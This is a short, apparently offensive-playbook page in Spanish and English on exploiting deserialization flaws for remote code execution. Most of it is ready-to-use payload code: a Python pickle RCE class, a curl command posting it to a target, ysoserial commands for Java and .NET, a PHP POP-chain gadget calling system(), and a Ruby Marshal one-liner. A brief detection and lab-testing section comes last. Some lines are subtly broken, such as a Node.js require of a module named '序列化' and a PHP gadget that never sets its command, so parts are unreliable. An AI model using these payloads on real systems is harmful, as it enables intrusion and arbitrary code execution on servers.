---
title: Deserialization Vulnerabilities
phase: explotacion
platform: web
tags: [deserialize, java, python, php, rce]
risk: critical
attack_tactic: TA0002
attack_technique: T1059
data_sources: [app-logs, ids-ips, waf-logs]
last_review: 2026-05-25
---

# Deserialization Vulnerabilities

### Objetivo

Explotar vulnerabilidades de deserialización para obtener ejecución de código remota (RCE) en aplicaciones que procesan datos serializados.

### Python Pickle

```python
# Malicious pickle payload
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = "whoami"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

```bash
# Send pickle payload
curl -X POST -d "data=BASE64_PAYLOAD" http://target.com/api/unpickle
```

### Java Native Serialization

```bash
# ysoserial generate payload
java -jar ysoserial.jar CommonsCollections6 "whoami" | base64

# Node.js deserialization attack
node -e "const rev = require('序列化'); rev.deserialize('MALICIOUS_PAYLOAD')"
```

### PHP Object Injection

```php
// POP chain payload
<?php
class PopChain {
    function __destruct() {
        system($this->cmd);
    }
}
echo urlencode(serialize(new PopChain()));
?>
```

### One-liners

```bash
# Ruby deserialization
ruby -r Marshal -e 'Marshal.load(Base64.decode64("PAYLOAD"))'

# .NET BinaryFormatter
# Use ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuse -c "whoami"
```

### Detección y Mitigación

- **Visibilidad:** Monitor for deserialization errors in logs, unexpected process execution post-deserialization.
- **Hardening:** Validate all input, use digital signatures on serialized data, avoid native serialization formats, implement type checking.

### Validación de Cobertura

- **Prueba técnica:** Send malicious serialized payload in lab.
- **Criterio de éxito:** Alert when arbitrary code execution is attempted via deserialization.
